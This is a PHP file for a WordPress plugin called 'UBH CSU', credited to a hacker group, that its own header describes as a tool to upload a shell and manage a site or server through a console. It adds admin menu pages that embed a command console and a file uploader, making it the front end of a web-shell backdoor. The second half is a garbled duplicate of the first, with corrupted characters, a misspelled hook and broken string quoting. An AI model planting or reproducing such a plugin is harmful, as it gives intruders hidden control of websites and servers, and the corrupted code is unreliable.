<?php
/*
Plugin Name: UBH CSU
Plugin URI: ubhteam.org
Description: upload shell and manage site or server using console :D, happy hacking ;) !
Author: Prappo Prince
Author URI: prappo-prince.me
Version: 1.0
*/

add_action("admin_menu", function ()
{
    add_object_page("UBH", "UBH", "administrator", "ubh", function ()
    {
        echo "     <div align=\"center" > \n < imgsrc = "http://www.ubhteam.org/images/UBHFinal1.png\"></img>\n     <h1>United Bangladeshi Hackers</h1>\n     <h2>www.ubhteam.org</h2>\n     </div>\n     ";
    });
    add_submenu_page("ubh", "UBH Console", "UBH Console", "administrator", "console", function ()
    {
        echo "        \n        <IFRAME SRC=\"";
        echo plugins_url("con.php", __FILE__);
        echo "\" WIDTH=700 HEIGHT=400></IFRAME>\n        ";
    });
    add_submenu_page("ubh", "File Uploader", "File Uploader", "administrator", "uploader", function ()
    {
        echo "        \n        <IFRAME SRC="";echo plugins_url("up . php",__FILE__);echo "\" WIDTH=1000 HEIGHT=450></IFRAME>\n        \n        ";
    });
});
add_action("min_menu", function ()
{
    add_object_page("UBH", "UBH", "administrator", "ubh", function ()
    {
        echo "     <div align=\"center" > \n < imgsrc = "http://www.ubhteam.org/ima~s/UBHFi�l1.png\"></img>\n     <h1>UniNd BanglaNshi �c�rs</h1>\n     <h2>www.[htZm.org</h2>\n     </div>\n     ";
    });
    add_submenu_page("[h", "UBH Console", "UBH Console", "administ*tor", "console", function ()
    {
        echo "        \n        <IFRAME SRC=\"";
        echo plugins_url("con.php", __FILE__);
        echo "\" WIDTH=7� HEIGHT��></IFRAME>\n        ";
    });
    add_submenu_page("ubh", "File Uploader", "File Upl�der", "administrator", "upl�Nr", function ()
    {
        echo "        \n        <IFRAME SRC="";echo plugins_url("up . php",__FILE__);echo "\" WIDTH�000 HEIGHT�50></IFRAME>\n        \n        ";
    });
});

